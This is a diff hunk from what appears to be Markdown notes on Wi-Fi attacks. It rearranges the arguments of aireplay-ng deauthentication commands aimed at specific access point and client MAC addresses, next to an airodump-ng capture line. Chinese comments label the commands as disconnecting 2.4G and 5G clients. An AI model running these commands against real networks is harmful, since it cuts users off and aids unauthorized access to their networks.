@@ -136,10 +136,10 @@ airodump-ng   -c 153 --bssid 4C:22:66:F1:28:00 -w /root/xx --ignore-negative-one
 
 ```shell
 #断开连接2.4G wifi的客户端
-aireplay-ng -0 5 -c  16:51:FB:CD:2A:2E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon24
+aireplay-ng -0 5  -a   3E:41:A0:44:E8:43  -c  16:51:FB:CD:2A:2E   --ignore-negative-one    mon24
 #断开连接5G wifi的客户端
-aireplay-ng -0 5 -c  FC:84:12:05:98:4F   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5
-aireplay-ng -0 5 -c 20:8F:42:22:E2:31   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5
+aireplay-ng -0 5  -a  4C:22:66:F1:28:00  -c  FC:84:12:05:98:4F    --ignore-negative-one    mon5
+aireplay-ng -0 5    -a  4C:22:66:F1:28:00 -c 20:8F:42:22:E2:31    --ignore-negative-one    mon5
 
 ```
 
